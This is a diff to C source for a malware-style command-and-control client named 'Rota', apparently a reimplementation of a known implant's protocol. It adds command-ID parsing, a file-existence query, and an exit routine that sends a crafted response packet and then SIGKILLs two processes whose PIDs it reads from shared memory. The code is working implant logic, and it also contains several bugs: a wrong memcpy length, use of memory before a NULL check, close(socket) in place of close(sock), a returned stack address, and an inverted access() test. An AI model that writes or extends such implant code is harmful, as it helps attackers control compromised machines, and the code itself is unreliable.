@@ -8,6 +8,7 @@
 #include <unistd.h>
 #include <arpa/inet.h>
 #include <sys/utsname.h>
+#include <signal.h>
 
 #include "c2_commands.h"
 
@@ -58,7 +59,12 @@ void c2_loop(){
 
         printf("Data received: %s\n", buffer);
 
-        unsigned char cmd_id[4];
+        char *cmd_id = (char *)malloc(4);
+        memset(cmd_id, 0, 4);
+        memcpy(cmd_id, &buffer[27], 2);
+        //cmd_id = parse_c2_cmdid(buffer);
+
+
 
         // exit ==> 0x13 0x8E 0x3E 0x06
         if (memcmp(&rota_c2_exit, cmd_id, 4) == 0) {
@@ -66,14 +72,12 @@ void c2_loop(){
             printf("[+] Rota C2 Run exiting!");
             #endif
 
-            char *msg = "exiting!";
-            send(sock, msg, strlen(msg), 0);
-            c2_exit();
+            c2_exit(sock);
         }
         // perform a "PING"/"PONG" connectivity test
         else if (memcmp(&rota_c2_test, cmd_id, 4) == 0) {
             #ifdef DEBUG
-            printf("[+] Rota C2 ping/png!");
+            printf("[+] Rota C2 ping/ping!");
             #endif
 
         }
@@ -114,6 +118,13 @@ void c2_loop(){
             printf("[+] Rota C2 Run query file\n");
             #endif
 
+            // get fpath as the "payload" portion of the Rota packet.
+            char *fpath = &buffer[82];
+            bool result = c2_query_file(fpath);
+            #ifdef DEBUG
+            printf("file path %s results in %d", fpath, result);
+            #endif
+
         }
         else if (memcmp(&rota_c2_delete_file, cmd_id, 4) == 0) {
             #ifdef DEBUG
@@ -151,8 +162,52 @@ void c2_loop(){
 }
 
 
-void c2_exit() {
-    exit(0);
+void c2_exit(int sock) {
+
+    char *msg = "exiting!";
+    int msgLen = strlen(msg);
+
+
+    // initial Rota header packet to overwrite values
+    // for response
+    char *rotaResp = initial_rota_pkt();
+
+    // updating message field with length of payload msg.
+    memcpy(&rotaResp[4], &msgLen, msgLen);
+
+    // set cmd id to "exit" (0x13, 0x8e, 0x3e, 0x06)
+    memcpy(&rotaResp[27], &rota_c2_exit, sizeof(rota_c2_exit));
+
+    // reallocate space from 82 byte header + response "body"
+    rotaResp = realloc(rotaResp, (82 + strlen(msg)));
+    memset(&rotaResp[82], 0, 8);
+
+    if (rotaResp == NULL) {
+        printf("error allocating data");
+        exit(1);
+    }
+
+    int totalSize = 82 + strlen(msg);
+    memcpy(&rotaResp[82], &msg, sizeof(msg));
+    memcpy(&rotaResp[82], msg, strlen(msg));
+
+    send(sock, rotaResp, totalSize, 0);
+
+    // get pids from sharedmem and kill both pids
+    int shmid = shmget(0x64b2e2, 8, 0666);
+
+    int *shmem_pid_addr = (int *)shmat(shmid, NULL, 0);
+    int *tmpPid = (int *)malloc(4);
+    memset(tmpPid, 0, 4);
+    memcpy(tmpPid, shmem_pid_addr, 4);
+
+    kill(*tmpPid, SIGKILL);
+    memset(tmpPid, 0, 4);
+    memcpy(tmpPid, shmem_pid_addr+4, 4);
+    kill(*tmpPid, SIGKILL);
+
+    // closing
+    close(socket);
 }
 
 void c2_test() {
@@ -167,7 +222,6 @@ void c2_heartbeat() {
 
 
 void c2_set_timeout(int *sleepTime, int newTime) {
-
     *sleepTime = newTime;
 }
 
@@ -194,14 +248,12 @@ char *c2_upload_device_info() {
 
 bool c2_query_file(char *fpath) {
 
-    // TODO check how this is executed in the binary.
     // F_OK == existence test
     if ((access(fpath, F_OK))) {
         return true;
     }
 
     return false;
-
 }
 
 
@@ -255,4 +307,28 @@ char *initial_rota_pkt() {
     memcpy(&rotaHdr[77], marker_4, sizeof(marker_4));
 
     return rotaHdr;
+}
+
+
+char *parse_c2_payload(char *buffer) {
+
+    int payload_len = buffer[4];
+    char *payload = (char *)malloc(payload_len);
+
+    if (payload == NULL){
+        #ifdef DEBUG
+        fprintf(stderr, "error allocating data in parse_c2_pkt");
+        #endif
+        exit(1);
+    }
+
+    return payload;
+}
+
+
+char *parse_c2_cmdid(char *buffer) {
+
+    char cmd_id[4] = {0x00};
+    memcpy(cmd_id, &buffer[27], 4);
+    return &cmd_id;
 }
